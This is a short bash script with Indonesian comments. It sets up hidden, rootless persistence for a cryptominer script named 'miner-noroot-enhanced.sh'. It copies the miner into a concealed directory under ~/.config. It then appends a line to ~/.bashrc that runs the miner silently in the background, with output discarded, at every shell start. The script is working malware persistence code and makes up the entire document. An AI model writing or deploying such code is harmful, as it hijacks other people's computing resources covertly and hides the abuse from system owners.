#!/bin/bash
set -e

# ========= Fake Autostart Tanpa Root ==========
CRON_DIR="$HOME/.config/.fakecron"
SCRIPT_NAME="miner-noroot-enhanced.sh"

mkdir -p "$CRON_DIR"
cp "$PWD/$SCRIPT_NAME" "$CRON_DIR/$SCRIPT_NAME"
chmod +x "$CRON_DIR/$SCRIPT_NAME"

# Tambahkan entry ke bashrc jika belum ada
if ! grep -q "$CRON_DIR/$SCRIPT_NAME" "$HOME/.bashrc"; then
  echo "[*] Menambahkan autostart palsu ke .bashrc..."
  echo "nohup bash $CRON_DIR/$SCRIPT_NAME > /dev/null 2>&1 &" >> "$HOME/.bashrc"
else
  echo "[*] Autostart sudah ada di .bashrc"
fi

echo "[✓] Fake cron auto-start berhasil disiapkan."
